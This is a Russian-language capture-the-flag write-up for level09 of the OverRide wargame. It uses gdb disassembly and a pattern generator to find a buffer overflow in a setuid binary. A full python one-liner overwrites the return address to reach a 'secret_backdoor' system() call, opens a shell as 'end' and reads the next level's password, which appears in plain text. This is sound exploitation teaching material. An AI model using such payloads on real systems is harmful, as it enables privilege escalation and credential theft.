[back](../defense.md)

Переполнение буфера

level08@OverRide:~$ su level09
Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09

level09@OverRide:~$ cd /home/users/level09
	dr-xr-x---+ 1 level09 level09    80 Oct  2  2016 .
	dr-x--x--x  1 root    root      260 Oct  2  2016 ..
	-rw-r--r--  1 level09 level09   220 Oct  2  2016 .bash_logout
	lrwxrwxrwx  1 root    root        7 Oct  2  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 level09 level09  3534 Oct  2  2016 .bashrc
	-rwsr-s---+ 1 end     users   12959 Oct  2  2016 level09
	-rw-r--r--+ 1 level09 level09    41 Oct 19  2016 .pass
	-rw-r--r--  1 level09 level09   675 Oct  2  2016 .profile

У исполняемого файла "level09" собственник "end"

При попытке запустить его мы получаем запрос имени и сообщения, 
которое отправляется "Unix-Dude" 
level09@OverRide:~$ ./level09
	--------------------------------------------
	|   ~Welcome to l33t-m$n ~    v1337        |
	--------------------------------------------
	>: Enter your username
	>>: Trifle
	>: Welcome, Trifle
	>: Msg @Unix-Dude
	>>: Hi
	>: Msg sent!

Исследуем файл с помощью gdb
level09@OverRide:~$ gdb level09
(gdb) disas main
	Dump of assembler code for function main:
   0x0000000000000aa8 <+0>:	push   %rbp
   0x0000000000000aa9 <+1>:	mov    %rsp,%rbp
   0x0000000000000aac <+4>:	lea    0x15d(%rip),%rdi        # 0xc10
   0x0000000000000ab3 <+11>:	callq  0x730 <puts@plt>
   0x0000000000000ab8 <+16>:	callq  0x8c0 <handle_msg>
   0x0000000000000abd <+21>:	mov    $0x0,%eax
   0x0000000000000ac2 <+26>:	pop    %rbp
   0x0000000000000ac3 <+27>:	retq   
	End of assembler dump.

Посмотрим все функции:
(gdb) info functions
	All defined functions:
	Non-debugging symbols:
	0x00000000000006f0  _init
	0x0000000000000720  strncpy
	0x0000000000000720  strncpy@plt
	0x0000000000000730  puts
	0x0000000000000730  puts@plt
	0x0000000000000740  system
	0x0000000000000740  system@plt
	0x0000000000000750  printf
	0x0000000000000750  printf@plt
	0x0000000000000760  __libc_start_main
	0x0000000000000760  __libc_start_main@plt
	0x0000000000000770  fgets
	0x0000000000000770  fgets@plt
	0x0000000000000780  __cxa_finalize
	0x0000000000000780  __cxa_finalize@plt
	0x0000000000000790  _start
	0x00000000000007bc  call_gmon_start
	0x00000000000007e0  __do_global_dtors_aux
	0x0000000000000860  frame_dummy
	0x000000000000088c  secret_backdoor
	0x00000000000008c0  handle_msg
	0x0000000000000932  set_msg
	0x00000000000009cd  set_username
	0x0000000000000aa8  main
	0x0000000000000ad0  __libc_csu_init
	0x0000000000000b60  __libc_csu_fini
	0x0000000000000b70  __do_gl

(gdb) disas handle_msg
	Dump of assembler code for function handle_msg:
   0x00000000000008c0 <+0>:	push   %rbp
   0x00000000000008c1 <+1>:	mov    %rsp,%rbp
	#### Initialize variables ####
   0x00000000000008c4 <+4>:	sub    $0xc0,%rsp             ; allocate 192 bytes on stack for local variables
   0x00000000000008cb <+11>:	lea    -0xc0(%rbp),%rax       ; struct s_message message;
   0x00000000000008d2 <+18>:	add    $0x8c,%rax             ; 140. 192 - 140 - 12 = 40
   0x00000000000008d8 <+24>:	movq   $0x0,(%rax)            ; bzero(message.username, 40) 
   0x00000000000008df <+31>:	movq   $0x0,0x8(%rax)         ; bzero(message.username, 40)
   0x00000000000008e7 <+39>:	movq   $0x0,0x10(%rax)        ; bzero(message.username, 40)
   0x00000000000008ef <+47>:	movq   $0x0,0x18(%rax)        ; bzero(message.username, 40)
   0x00000000000008f7 <+55>:	movq   $0x0,0x20(%rax)        ; bzero(message.username, 40)
   0x00000000000008ff <+63>:	movl   $0x8c,-0xc(%rbp)       ; message.len_message = 140;
	#### set_username ####
   0x0000000000000906 <+70>:	lea    -0xc0(%rbp),%rax       ; message
   0x000000000000090d <+77>:	mov    %rax,%rdi              ; message
   0x0000000000000910 <+80>:	callq  0x9cd <set_username>   ; set_username(&message);
	#### set_msg ####
   0x0000000000000915 <+85>:	lea    -0xc0(%rbp),%rax       ; message
   0x000000000000091c <+92>:	mov    %rax,%rdi              ; message
   0x000000000000091f <+95>:	callq  0x932 <set_msg>        ; set_msg(&message);
	#### print "Msg sent!" ####
   0x0000000000000924 <+100>:	lea    0x295(%rip),%rdi       # 0xbc0 ; ">: Msg sent!"
   0x000000000000092b <+107>:	callq  0x730 <puts@plt>       ; puts(">: Msg sent!");
   0x0000000000000930 <+112>:	leaveq
   0x0000000000000931 <+113>:	retq
	End of assembler dump.

handle_msg - декларирует структуру с 40 байт для записи имени, но не защищен от переполнения

Попробуем переполнить буфер
level09@OverRide:~$ (python -c 'print "d" * 40 + "\xff"'; cat) | ./level09
	--------------------------------------------
	|   ~Welcome to l33t-m$n ~    v1337        |
	--------------------------------------------
	>: Enter your username
	>>: >: Welcome, dddddddddddddddddddddddddddddddddddddddd?>: Msg @Unix-Dude
	>>: >: Msg sent!
	Segmentation fault (core dumped)
level09@OverRide:~$ 

Сега, отлично

Поскольку двоичный файл был скомпилирован в 64-разрядном формате, нам нужно найти правильное смещение, 
чтобы перезаписать содержимое указателя стека RSP (не EIP/RIP), 
чтобы заставить `handle_msg` перейти к `secret_backdoor`, а не вернуться к `main`.

Мы видим функцию "secret_backdoor", 
которая читает в буфер из стандартного ввода, 
а затем вызывает "system" с буфером. 

(gdb) disas secret_backdoor
	Dump of assembler code for function secret_backdoor:
   0x000000000000088c <+0>:	push   %rbp
   0x000000000000088d <+1>:	mov    %rsp,%rbp
   0x0000000000000890 <+4>:	add    $0xffffffffffffff80,%rsp
	#### Read from stdin ####
   0x0000000000000894 <+8>:	mov    0x20171d(%rip),%rax       # 0x201fb8 ; stdin
   0x000000000000089b <+15>:	mov    (%rax),%rax               ; stdin
   0x000000000000089e <+18>:	mov    %rax,%rdx                 ; load arg 3 - stdin
   0x00000000000008a1 <+21>:	lea    -0x80(%rbp),%rax          ; char buffer[128]; 
   0x00000000000008a5 <+25>:	mov    $0x80,%esi                ; load arg 2 - 128
   0x00000000000008aa <+30>:	mov    %rax,%rdi                 ; load arg 1 - buffer
   0x00000000000008ad <+33>:	callq  0x770 <fgets@plt>         ; fgets(buffer, 128, stdin);
	#### call system() ####
   0x00000000000008b2 <+38>:	lea    -0x80(%rbp),%rax          ; buffer
   0x00000000000008b6 <+42>:	mov    %rax,%rdi                 ; load arg - buffer
   0x00000000000008b9 <+45>:	callq  0x740 <system@plt>        ; system(buffer);
   0x00000000000008be <+50>:	leaveq
   0x00000000000008bf <+51>:	retq
	End of assembler dump.

Используем генератор переполнения буфера (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)

level09@OverRide:~$ gdb -q level09
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
(gdb) run
	Starting program: /home/users/level09/level09 
	--------------------------------------------
	|   ~Welcome to l33t-m$n ~    v1337        |
	--------------------------------------------
	>: Enter your username
	>>: dddddddddddddddddddddddddddddddddddddddd�
	>: Welcome, dddddddddddddddddddddddddddddddddddddddd?>: Msg @Unix-Dude
	>>: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
	>: Msg sent!
	Program received signal SIGSEGV, Segmentation fault.
	0x0000555555554931 in handle_msg ()
(gdb) x/s $rsp 
	0x7fffffffe5c8:	 "6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah"

Узнаем адрес secret_backdoor
(gdb) print secret_backdoor
	$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>

То есть, мы выяснили, что возможно переполнить буфер и у нас имеются все необходимые данные:
1. до переполнения имени пользователя необходимо 40 байт + для переполнения добвавляем "\xff" и перевод строки "\n"
2. буфер сообщения до переполнения RSP 200 байт + для перехода к `secret_backdoor` 0x55555555488c ("\x8c\x48\x55\x55\x55\x55\x00") и перевод строки "\n"
3. запустить shell

Попробуем это реализовать:
level09@OverRide:~$ (python -c 'print "d" * 40 + "\xff" + "\n" + "d" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, dddddddddddddddddddddddddddddddddddddddd?>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
	end
cat /home/users/end/.pass
	j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
^C
	Segmentation fault (core dumped)
level09@OverRide:~$ su end
Password: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
end@OverRide:~$ cd /home/users/end
end@OverRide:~$ ls -la
	total 13
	dr-xr-x---+ 1 end  end     80 Sep 13  2016 .
	dr-x--x--x  1 root root   260 Oct  2  2016 ..
	-rw-r--r--  1 end  end    220 Sep 10  2016 .bash_logout
	lrwxrwxrwx  1 root root     7 Sep 13  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 end  end   3489 Sep 10  2016 .bashrc
	-rwsr-s---+ 1 end  users    5 Sep 10  2016 end
	-rw-r--r--+ 1 end  end     41 Oct 19  2016 .pass
	-rw-r--r--  1 end  end    675 Sep 10  2016 .profile
end@OverRide:~$ cat end
	GG !
end@OverRide:~$ 

Good Game !

[back](../defense.md)
